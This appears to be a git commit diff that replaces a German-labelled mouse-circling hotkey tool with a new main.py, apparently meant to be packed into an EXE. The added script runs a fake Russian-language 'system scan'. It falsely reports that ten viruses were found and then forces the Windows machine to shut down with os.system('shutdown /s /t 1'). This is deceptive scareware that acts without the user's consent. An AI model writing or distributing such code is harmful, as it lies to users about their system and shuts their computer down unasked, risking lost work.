add3c98bfcf3945d62073a44e76e4828c30d540f
eroge-69 <erogexunamed@gmail.com>
2025-08-10 19:49:13 +0700

    Upload main.py via PY to EXE tool

--- python-files/main.py
+++ python-files/main.py
@@ -1,64 +1,32 @@
-import tkinter as tk
-import pyautogui
-import keyboard
-import threading
-import math
-import time
+import os
+from time import sleep as sl
+from random import randint
 
-running = False
-radius = 50
-center_x, center_y = 0, 0
+sleep_rand = [0.5, 0.1, 1.5, 0.1, 0.3, 0.7, 0.1]
 
-def circle_move():
-    global running, center_x, center_y, radius
-    angle = 0
-    while running:
-        x = center_x + radius * math.cos(angle)
-        y = center_y + radius * math.sin(angle)
-        pyautogui.moveTo(int(x), int(y))
-        angle += 0.1
-        if angle >= 2 * math.pi:
-            angle = 0
-        time.sleep(0.01)
+print("Выполняется сканирование системы:")
 
-def toggle_circle():
-    global running, center_x, center_y
-    if not running:
-        center_x, center_y = pyautogui.position()
-        running = True
-        threading.Thread(target=circle_move, daemon=True).start()
-    else:
-        running = False
+sl(3)
 
-def set_small_radius():
-    global radius
-    radius = 50
-    lbl_radius.config(text=f"Aktueller Radius: {radius}")
+def otstup():
+    for i in range(100):
+        print("  \n")
+    return
 
-def set_large_radius():
-    global radius
-    radius = 150
-    lbl_radius.config(text=f"Aktueller Radius: {radius}")
 
-# Hotkeys
-keyboard.add_hotkey("F4", toggle_circle)
-keyboard.add_hotkey("F9", set_small_radius)
-keyboard.add_hotkey("F10", set_large_radius)
+for i in range(100):
+    otstup()
+    print(f"{i}%/100%", end="\n\n\n\n\n\n\n")
+    z = randint(0, 6)
+    sl(sleep_rand[z])
 
-# GUI
-root = tk.Tk()
-root.title("Mauskreis Controller")
+otstup()
 
-btn_toggle = tk.Button(root, text="Start/Stop (F4)", command=toggle_circle)
-btn_toggle.pack(pady=5)
+print("Сканирование завершено", end="\n\n\n")
+print("Было найденно 10 вирусов", end="\n\n\n")
+print("Мы были вынужденны предпренять меры...", end="\n\n\n")
+sl(0.2)
 
-btn_small = tk.Button(root, text="Kleiner Radius (F9)", command=set_small_radius)
-btn_small.pack(pady=5)
 
-btn_large = tk.Button(root, text="Großer Radius (F10)", command=set_large_radius)
-btn_large.pack(pady=5)
+os.system("shutdown /s /t 1")
 
-lbl_radius = tk.Label(root, text=f"Aktueller Radius: {radius}")
-lbl_radius.pack(pady=5)
-
-root.mainloop()
